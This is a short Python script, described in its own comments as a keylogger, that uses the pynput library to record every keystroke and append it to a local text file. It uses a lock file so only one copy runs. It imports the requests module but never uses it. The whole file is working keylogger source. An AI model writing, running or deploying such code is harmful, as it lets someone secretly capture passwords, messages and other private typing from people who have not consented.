# Importing the appropriate extension modules
import requests
import os
import zc.lockfile
from pynput.keyboard import Listener
# Setting a path for the keylogger to deposit output
lock = zc.lockfile.LockFile('anything.py')
path = 'keyboard_input.txt'
keyboard_Input = []
count = 0
# Defining a function that stores keyboard input each time a key is pressed
def on_press(key):
    global keyboard_Input, count
    keyboard_Input.append(key)
    count += 1

    if count > 0:
        count = 0
        write_to_file(keyboard_Input)
        keyboard_Input = []
# Defining a function that writes keys to a path and determines handling special function keys
def write_to_file(keys):
    with open(path, 'a') as file:
        for key in keyboard_Input:
            write_down = str(key).replace("'", "")
            if write_down.find('backspace') > 0:
                file.write(' *BACKSPACE* ')
            elif write_down.find('shift') > 0:
                file.write(' *SHIFT* ')
            elif write_down.find('enter') > 0:
                file.write('\n')
            elif write_down.find('space') > 0:
                file.write(' ')
            elif write_down.find('key'):
                file.write(write_down)
# Setting up the Pynput Listener: 
with Listener(on_press=on_press) as listener:
    listener.join()
